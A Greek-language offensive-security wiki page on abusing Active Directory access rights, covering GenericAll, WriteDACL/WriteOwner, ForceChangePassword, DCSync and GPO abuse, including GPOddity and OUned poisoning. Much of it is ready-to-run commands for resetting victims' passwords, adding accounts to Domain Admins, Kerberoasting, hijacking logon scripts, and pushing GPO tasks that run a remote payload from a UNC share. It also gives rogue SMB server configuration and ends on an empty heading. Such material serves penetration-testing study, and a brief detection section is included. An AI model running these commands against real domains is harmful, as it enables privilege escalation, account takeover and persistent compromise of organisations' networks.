# Κατάχρηση των ACL/ACE του Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα αποτελεί κυρίως σύνοψη των τεχνικών από τα** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, συμβουλευτείτε τα αρχικά άρθρα.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Δικαιώματα GenericAll σε χρήστη**

Αυτό το προνόμιο παρέχει στον επιτιθέμενο πλήρη έλεγχο ενός λογαριασμού χρήστη-στόχου. Μόλις επιβεβαιωθούν τα δικαιώματα `GenericAll` με την εντολή `Get-ObjectAcl`, ο επιτιθέμενος μπορεί να:

- **Αλλάξει τον κωδικό πρόσβασης του στόχου**: Με την εντολή `net user <username> <password> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό πρόσβασης του χρήστη.
- Από Linux, μπορείτε να κάνετε το ίδιο μέσω SAMR με το Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Αν ο λογαριασμός είναι απενεργοποιημένος, αφαιρέστε τη σημαία UAC**: Το `GenericAll` επιτρέπει την επεξεργασία του `userAccountControl`. Από Linux, το BloodyAD μπορεί να αφαιρέσει τη σημαία `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Αναθέστε ένα SPN στον λογαριασμό του χρήστη για να γίνει kerberoastable και, στη συνέχεια, χρησιμοποιήστε τα Rubeus και targetedKerberoast.py για να εξαγάγετε τα hashes του ticket-granting ticket (TGT) και να επιχειρήσετε να τα σπάσετε.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Απενεργοποιήστε τον προέλεγχο ταυτότητας για τον χρήστη, καθιστώντας τον λογαριασμό του ευάλωτο σε ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Με `GenericAll` σε έναν χρήστη, μπορείτε να προσθέσετε ένα credential βασισμένο σε πιστοποιητικό και να κάνετε authenticate ως αυτός χωρίς να αλλάξετε τον κωδικό πρόσβασής του. Δείτε:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Δικαιώματα GenericAll σε ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν attacker να τροποποιήσει τις συμμετοχές σε ομάδες, αν έχει δικαιώματα `GenericAll` σε μια ομάδα όπως η `Domain Admins`. Αφού εντοπίσει το distinguished name της ομάδας με το `Get-NetGroup`, ο attacker μπορεί να:

- **Προσθέσει τον εαυτό του στην ομάδα Domain Admins**: Αυτό μπορεί να γίνει με άμεσες εντολές ή με modules όπως το Active Directory ή το PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Από Linux μπορείτε επίσης να αξιοποιήσετε το BloodyAD για να προσθέσετε τον εαυτό σας σε αυθαίρετες ομάδες, όταν έχετε δικαιώματα GenericAll/Write στη διαχείριση της συμμετοχής τους. Αν η ομάδα-στόχος είναι ένθετη στην ομάδα «Remote Management Users», θα αποκτήσετε αμέσως πρόσβαση WinRM σε hosts που αναγνωρίζουν αυτή την ομάδα:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Εγγραφή σε υπολογιστή/χρήστη**

Η κατοχή αυτών των προνομίων σε ένα αντικείμενο υπολογιστή ή σε έναν λογαριασμό χρήστη επιτρέπει τα εξής:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την κατάληψη ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρησιμοποιήστε αυτήν την τεχνική για να υποδυθείτε έναν λογαριασμό υπολογιστή ή χρήστη, εκμεταλλευόμενοι τα προνόμια για τη δημιουργία shadow credentials.

## **WriteProperty σε ομάδα**

Αν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα μιας συγκεκριμένης ομάδας (π.χ., `Domain Admins`), μπορεί να:

- **Προσθέσει τον εαυτό του στην ομάδα Domain Admins**: Αυτό μπορεί να επιτευχθεί συνδυάζοντας τις εντολές `net user` και `Add-NetGroupUser` και επιτρέπει την κλιμάκωση προνομίων εντός του domain.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) σε ομάδα**

Αυτό το προνόμιο επιτρέπει στους επιτιθέμενους να προσθέσουν τους εαυτούς τους σε συγκεκριμένες ομάδες, όπως η `Domain Admins`, μέσω εντολών που τροποποιούν απευθείας τη συμμετοχή σε ομάδες. Η ακόλουθη ακολουθία εντολών επιτρέπει την αυτοπροσθήκη:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Ένα παρόμοιο προνόμιο, που επιτρέπει στους επιτιθέμενους να προσθέτουν απευθείας τους εαυτούς τους σε ομάδες, τροποποιώντας τις ιδιότητες των ομάδων, εφόσον έχουν το δικαίωμα `WriteProperty` σε αυτές. Η επιβεβαίωση και η εκτέλεση αυτού του προνομίου γίνονται με:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει την επαναφορά του κωδικού πρόσβασης χωρίς να είναι γνωστός ο τρέχων κωδικός. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας διάφορες μεθόδους επαναφοράς του κωδικού πρόσβασης ενός χρήστη, όπως διαδραστικές συνεδρίες και μονογραμμικές εντολές για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως τη χρήση του `rpcclient` σε Linux, καταδεικνύοντας την ευελιξία των διανυσμάτων επίθεσης.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner on Group**

Αν ένας attacker διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει τον κάτοχο της ομάδας σε 자신. Αυτό έχει ιδιαίτερα σημαντικό αντίκτυπο όταν η εν λόγω ομάδα είναι η `Domain Admins`, καθώς η αλλαγή του κατόχου επιτρέπει ευρύτερο έλεγχο των χαρακτηριστικών και των μελών της ομάδας. Η διαδικασία περιλαμβάνει τον εντοπισμό του σωστού αντικειμένου μέσω του `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για την αλλαγή του κατόχου, είτε μέσω SID είτε μέσω ονόματος.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite σε χρήστη**

Αυτό το δικαίωμα επιτρέπει σε έναν attacker να τροποποιεί τις ιδιότητες ενός χρήστη. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο attacker μπορεί να αλλάξει τη διαδρομή του logon script ενός χρήστη, ώστε να εκτελείται ένα κακόβουλο script κατά τη σύνδεση του χρήστη. Αυτό επιτυγχάνεται με τη χρήση της εντολής `Set-ADObject` για την ενημέρωση της ιδιότητας `scriptpath` του χρήστη-στόχου, ώστε να δείχνει στο script του attacker.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Ένα πιο περιορισμένο ACE `WriteProperty`, με εμβέλεια μόνο στο attribute [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) του χρήστη, μπορεί να επαρκεί· δεν απαιτείται `GenericWrite`. Συνδυάστε αυτό το δικαίωμα στο attribute με ένα εγγράψιμο script στο δέντρο `SYSVOL\<domain>\scripts` ή `NETLOGON` του domain και αξιολογήστε αν είναι πιθανό ο χρήστης-στόχος να συνδεθεί και να εκτελέσει το script. Το script εκτελείται στο πλαίσιο του συγκεκριμένου χρήστη κατά τη σύνδεση. Ελέγξτε ξεχωριστά τα αποτελεσματικά ACL του AD και τα ACL αρχείων/κοινόχρηστων πόρων· ένα ACE Allow που ταιριάζει ή ένας εγγράψιμος κατάλογος από μόνος του δεν αποδεικνύει ότι υπάρχει ολόκληρη η διαδρομή.

## **GenericWrite on Group**

Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να χειριστούν τη συμμετοχή σε ομάδες, για παράδειγμα προσθέτοντας τους εαυτούς τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτηρίων, τη χρήση του για την προσθήκη ή την αφαίρεση χρηστών από μια ομάδα και την επαλήθευση των αλλαγών συμμετοχής με εντολές PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Από Linux, το Samba `net` μπορεί να προσθέσει/αφαιρέσει μέλη όταν έχετε δικαίωμα `GenericWrite` στην ομάδα (χρήσιμο όταν δεν είναι διαθέσιμα τα PowerShell/RSAT):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Η κατοχή ενός αντικειμένου AD και τα δικαιώματα `WriteDACL` σε αυτό επιτρέπουν σε έναν attacker να εκχωρήσει στον εαυτό του δικαιώματα `GenericAll` στο αντικείμενο. Αυτό επιτυγχάνεται μέσω χειρισμού του ADSI, παρέχοντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα τροποποίησης των συμμετοχών του σε ομάδες. Παρ' όλα αυτά, υπάρχουν περιορισμοί κατά την προσπάθεια εκμετάλλευσης αυτών των δικαιωμάτων με τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Γρήγορη ανάληψη ελέγχου με WriteDACL/WriteOwner (PowerView)

Όταν έχετε `WriteOwner` και `WriteDacl` σε έναν χρήστη ή λογαριασμό υπηρεσίας, μπορείτε να αποκτήσετε πλήρη έλεγχο και να επαναφέρετε τον κωδικό πρόσβασής του χρησιμοποιώντας το PowerView, χωρίς να γνωρίζετε τον παλιό κωδικό:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Σημειώσεις:
- Ίσως χρειαστεί πρώτα να αλλάξετε τον κάτοχο σε εσάς, αν έχετε μόνο `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Επαληθεύστε την πρόσβαση με οποιοδήποτε πρωτόκολλο (SMB/LDAP/RDP/WinRM) μετά την επαναφορά του κωδικού πρόσβασης.

## **Αναπαραγωγή στον τομέα (DCSync)**

Η επίθεση DCSync αξιοποιεί συγκεκριμένα δικαιώματα αναπαραγωγής στον τομέα για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων των διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως το `DS-Replication-Get-Changes`, τα οποία επιτρέπουν στους επιτιθέμενους να εξαγάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε Domain Controller.<sup>[[5]](#references)</sup> [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)

## Ανάθεση GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η ανάθεση πρόσβασης για τη διαχείριση Group Policy Objects (GPOs) μπορεί να δημιουργήσει σημαντικούς κινδύνους ασφαλείας. Για παράδειγμα, αν σε έναν χρήστη όπως ο `offense\spotless` έχουν ανατεθεί δικαιώματα διαχείρισης GPO, ενδέχεται να διαθέτει προνόμια όπως **WriteProperty**, **WriteDacl** και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να αξιοποιηθούν για κακόβουλους σκοπούς, όπως εντοπίστηκαν με το PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Απαρίθμηση δικαιωμάτων GPO

Για τον εντοπισμό λανθασμένα ρυθμισμένων GPO, μπορούν να συνδυαστούν cmdlets του PowerSploit. Έτσι εντοπίζονται GPO που ένας συγκεκριμένος χρήστης έχει δικαιώματα να διαχειρίζεται: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Υπολογιστές στους οποίους εφαρμόζεται μια συγκεκριμένη πολιτική**: Είναι δυνατό να εντοπίσετε σε ποιους υπολογιστές εφαρμόζεται ένα συγκεκριμένο GPO, ώστε να κατανοήσετε την έκταση του δυνητικού αντίκτυπου. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Πολιτικές που εφαρμόζονται σε συγκεκριμένο υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορείτε να χρησιμοποιήσετε εντολές όπως το `Get-DomainGPO`.

**OU στις οποίες εφαρμόζεται μια συγκεκριμένη πολιτική**: Μπορείτε να εντοπίσετε τις organizational units (OUs) που επηρεάζονται από μια συγκεκριμένη πολιτική χρησιμοποιώντας το `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**GPOHound**](https://github.com/cogiceo/GPOHound) για να απαριθμήσετε GPO και να εντοπίσετε προβλήματα σε αυτά.

### Κατάχρηση GPO - New-GPOImmediateTask

Τα λανθασμένα ρυθμισμένα GPO μπορούν να αξιοποιηθούν για την εκτέλεση κώδικα, για παράδειγμα, με τη δημιουργία μιας άμεσης προγραμματισμένης εργασίας. Αυτό μπορεί να χρησιμοποιηθεί για την προσθήκη ενός χρήστη στην ομάδα τοπικών διαχειριστών σε επηρεαζόμενα μηχανήματα, αυξάνοντας σημαντικά τα προνόμιά του:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Το GroupPolicy module, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPO, καθώς και τον ορισμό προτιμήσεων, όπως τιμές μητρώου, για την εκτέλεση backdoors σε επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί την ενημέρωση του GPO και τη σύνδεση ενός χρήστη στον υπολογιστή για την εκτέλεση:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Κατάχρηση GPO

Το SharpGPOAbuse προσφέρει έναν τρόπο κατάχρησης υπαρχόντων GPO, προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις, χωρίς να χρειάζεται η δημιουργία νέων GPO. Αυτό το εργαλείο απαιτεί την τροποποίηση υπαρχόντων GPO ή τη χρήση εργαλείων RSAT για τη δημιουργία νέων πριν από την εφαρμογή των αλλαγών:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Αναγκαστική ενημέρωση πολιτικής

Οι ενημερώσεις GPO πραγματοποιούνται συνήθως περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ιδιαίτερα μετά την εφαρμογή μιας αλλαγής, μπορείτε να εκτελέσετε την εντολή `gpupdate /force` στον υπολογιστή-στόχο, ώστε να επιβάλετε άμεση ενημέρωση πολιτικής. Με αυτή την εντολή, οι τροποποιήσεις των GPO εφαρμόζονται χωρίς να χρειάζεται να περιμένετε τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Τι συμβαίνει στο παρασκήνιο

Κατά την επιθεώρηση των Scheduled Tasks ενός GPO, όπως του `Misconfigured Policy`, μπορείτε να επιβεβαιώσετε την προσθήκη εργασιών όπως η `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω scripts ή εργαλείων γραμμής εντολών με σκοπό την τροποποίηση της συμπεριφοράς του συστήματος ή την κλιμάκωση προνομίων.

Η δομή της εργασίας, όπως εμφανίζεται στο αρχείο ρυθμίσεων XML που δημιουργεί το `New-GPOImmediateTask`, περιγράφει τα χαρακτηριστικά της προγραμματισμένης εργασίας, μεταξύ άλλων την εντολή που θα εκτελεστεί και τα εναύσματά της. Αυτό το αρχείο δείχνει πώς ορίζονται και διαχειρίζονται οι προγραμματισμένες εργασίες μέσα στα GPO, παρέχοντας έναν τρόπο εκτέλεσης αυθαίρετων εντολών ή scripts στο πλαίσιο της εφαρμογής πολιτικών.

### Χρήστες και ομάδες

Τα GPO επιτρέπουν επίσης τον χειρισμό της συμμετοχής χρηστών και ομάδων στα συστήματα-στόχους. Τροποποιώντας απευθείας τα αρχεία πολιτικής Users and Groups, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως την τοπική ομάδα `administrators`. Αυτό είναι δυνατό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, η οποία επιτρέπει την τροποποίηση αρχείων πολιτικής για την προσθήκη χρηστών ή την αλλαγή συμμετοχών σε ομάδες.

Το αρχείο ρυθμίσεων XML για τους Users and Groups περιγράφει πώς εφαρμόζονται αυτές οι αλλαγές. Με την προσθήκη καταχωρίσεων σε αυτό το αρχείο, μπορούν να εκχωρηθούν αυξημένα προνόμια σε συγκεκριμένους χρήστες σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει έναν άμεσο τρόπο κλιμάκωσης προνομίων μέσω χειρισμού GPO.

Για ρυθμίσεις ασφαλείας, όπως η συμμετοχή σε τοπικές ομάδες και τα δικαιώματα χρηστών, ελέγξτε επίσης το εφαρμοσμένο πρότυπο GPO στη διαδρομή `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` και το ACL του καταλόγου `SecEdit`. Ένας εγγράψιμος κατάλογος ή αρχείο αποτελεί ένδειξη για περαιτέρω έλεγχο: η πραγματική πρόσβαση στο κοινόχρηστο στοιχείο SYSVOL, τα deny και τα κληρονομημένα ACL, τα δικαιώματα του Group Policy container, το πεδίο εφαρμογής της πολιτικής και η ανανέωση από τον client εξακολουθούν να καθορίζουν αν μπορεί να εφαρμοστεί μια αλλαγή. Η συμμετοχή σε μια ομάδα με όνομα “GPO Managers” από μόνη της δεν αποδεικνύει δικαιώματα επεξεργασίας. [Η Microsoft τεκμηριώνει αυτή τη διαδρομή προτύπου και τον διαχωρισμό ανάμεσα στο Group Policy container και το πρότυπο.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Επιπλέον, μπορούν να εξεταστούν και άλλες μέθοδοι εκτέλεσης κώδικα ή διατήρησης persistence, όπως η αξιοποίηση scripts σύνδεσης/αποσύνδεσης, η τροποποίηση κλειδιών registry για autoruns, η εγκατάσταση λογισμικού μέσω αρχείων .msi ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορους τρόπους διατήρησης της πρόσβασης και ελέγχου των συστημάτων-στόχων μέσω κατάχρησης GPO.

### Ανακατεύθυνση της ανάκτησης GPC/GPT σε αυθεντικοποιημένες rogue υπηρεσίες

Ένα GPO αποτελείται από ένα LDAP **Group Policy Container (GPC)** με μεταδεδομένα και ένα **Group Policy Template (GPT)** που φιλοξενείται σε SMB και περιέχει τα αρχεία πολιτικής. Κατά την ανανέωση, ο client ακολουθεί το `gPLink` του container, διαβάζει το σχετικό GPC και το `gPCFileSysPath` του και, στη συνέχεια, κατεβάζει το GPT από αυτήν τη διαδρομή UNC. Επομένως, η πρόσβαση εγγραφής είτε στο ίδιο το GPC είτε στο `gPLink` ενός OU, Site ή Domain μπορεί να αξιοποιηθεί για την επεξεργασία προνομιούχων πολιτικών.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Poisoning του `gPCFileSysPath` με GPOddity

Αν η ελεγχόμενη principal μπορεί να γράψει στο GPC-στόχο (απευθείας ή μέσω **NTLM relay to LDAP**), αντικαταστήστε το `gPCFileSysPath` με μια διαδρομή UNC που φιλοξενείται από τον επιτιθέμενο. Το [GPOddity](https://github.com/synacktiv/GPOddity) αυτοματοποιεί την αλλαγή LDAP και παρέχει ένα κακόβουλο GPT που περιέχει αρχεία πολιτικής βασισμένα σε modules ή ένα Immediate Task, το οποίο εκτελεί ο Group Policy client ως `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Ένα ανώνυμο SMB share ή ένα share που δεν απαιτεί διαπιστευτήρια δεν επαρκεί σε σύγχρονους Windows clients: το SMB Secure Negotiate απαιτεί απόδειξη επιτυχούς αυθεντικοποίησης, επομένως η rogue υπηρεσία πρέπει να επικυρώνει την ταυτότητα του domain, να υπολογίζει το κλειδί συνεδρίας SMB και να υπογράφει σωστά τις αποκρίσεις της. Σε embedded mode, ρυθμίστε το GPOddity με έναν ελεγχόμενο machine account και το κλειδί υπηρεσίας του και, στη συνέχεια, επιλέξτε payload πλευράς υπολογιστή ή χρήστη στην ενότητα `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Οριακή περίπτωση GPO:** μετά το MS16-072, τα Windows εξακολουθούν να δημιουργούν δύο SMB2 sessions στην **ίδια TCP connection**: το user session διαβάζει το `GPT.INI` και, στη συνέχεια, το session του computer account διαβάζει την ενεργή διαμόρφωση, όπως το `ScheduledTasks.xml`. Επομένως, ένας κακόβουλος server πρέπει να συσχετίζει την κατάσταση authentication, τα session keys και τα signing keys με βάση το SMB2 `SessionId` και όχι μόνο το socket. Το fork του Scapy που είναι ενσωματωμένο στο GPOddity/OUned υλοποιεί αυτή τη λειτουργία μέσω των `SMBStreamSocketMultiplexing` και ενός `SMBServer` που υποστηρίζει multiplexing· διαφορετικά, οι servers Impacket/Scapy που υποστηρίζουν μόνο ένα session επαναχρησιμοποιούν εσφαλμένη κατάσταση signing και αποτυγχάνουν με τις user policies.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning με OUned

Με δικαιώματα `WriteGPLink`, `GenericWrite` ή ισοδύναμο έλεγχο σε OU, Site ή Domain, ένας attacker μπορεί να προσθέσει ένα link του οποίου το GPC DN παρέχεται από LDAP host που ελέγχει ο attacker. Αυτό το primitive παρουσιάστηκε αρχικά από τον Petros Koutroumpis· το [OUned](https://github.com/synacktiv/OUned) αυτοματοποιεί την εγγραφή LDAP και την αλυσίδα κακόβουλων GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Το θύμα αυθεντικοποιείται αρχικά στην κακόβουλη υπηρεσία LDAP και λαμβάνει ένα GPC του οποίου το `gPCFileSysPath` δείχνει στην κακόβουλη υπηρεσία SMB· στη συνέχεια αυθεντικοποιείται στο SMB και εφαρμόζει το παρεχόμενο GPT. Επομένως, το OUned χρειάζεται έναν λογαριασμό με LDAP SPN, έναν λογαριασμό υπολογιστή με HOST SPN για SMB (ο ίδιος λογαριασμός υπολογιστή μπορεί να καλύψει και τα δύο) και επίλυση DNS ή αντίστροφη προώθηση που στέλνει τις θύρες 389 και 445 στον υπολογιστή του χειριστή.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Το ενσωματωμένο Scapy LDAP server του OUned επικυρώνει Kerberos/SPNEGO με το πραγματικό κλειδί της ελεγχόμενης υπηρεσίας και παρέχει αυθαίρετα δεδομένα GPC από JSON. Το κενό κλειδί JSON αναπαριστά το rootDSE, τα προθέματα `base64:` αναπαριστούν δυαδικές τιμές, ενώ ο server υποστηρίζει add/delete/modify/search και αναζητήσεις `BASE`, `LEVEL` και `SUBTREE`. Μπορεί να διαπραγματευτεί χωρίς προστασία, με ακεραιότητα ή με εμπιστευτικότητα. Έτσι, η υπηρεσία μπορεί να επαναχρησιμοποιηθεί όταν κάποιο άλλο στοιχείο των Windows ακολουθεί μια αναφορά LDAP που ελέγχεται από επιτιθέμενο, αλλά απαιτεί αυθεντικοποιημένο LDAP.<sup>[[15]](#references)</sup>

Μην υποθέτετε ότι ο συγχρονισμός του κωδικού πρόσβασης ενός λογαριασμού σε ένα dummy domain αναπαράγει κάθε κλειδί Kerberos: το RC4 παράγεται από τον κωδικό πρόσβασης, ενώ το AES string-to-key χρησιμοποιεί επίσης salt που προκύπτει από το hostname/domain του principal. Η παροχή του πραγματικού AES key του λογαριασμού στο `KerberosSSP` αποφεύγει την επιβολή χρήσης RC4 μέσω ανιχνεύσιμης αλλαγής στο αυτοεγγράψιμο `msDS-SupportedEncryptionTypes` του machine account.<sup>[[15]](#references)</sup>

#### Δείκτες ανίχνευσης

Συσχετίστε αλλαγές στα `gPCFileSysPath` ή `gPLink` με αλλαγές έκδοσης GPO και νέα XML για Immediate/Scheduled Task. Ερευνήστε συνδέσμους προς μη αναμενόμενα naming contexts, UNC hosts εκτός του εγκεκριμένου συνόλου DC/SYSVOL, εγγραφές DNS που ανακατευθύνουν ονόματα machine accounts, service tickets LDAP/CIFS για ασυνήθιστα machine accounts, καθώς και αλλαγές στο `msDS-SupportedEncryptionTypes` που ενεργοποιούν το RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

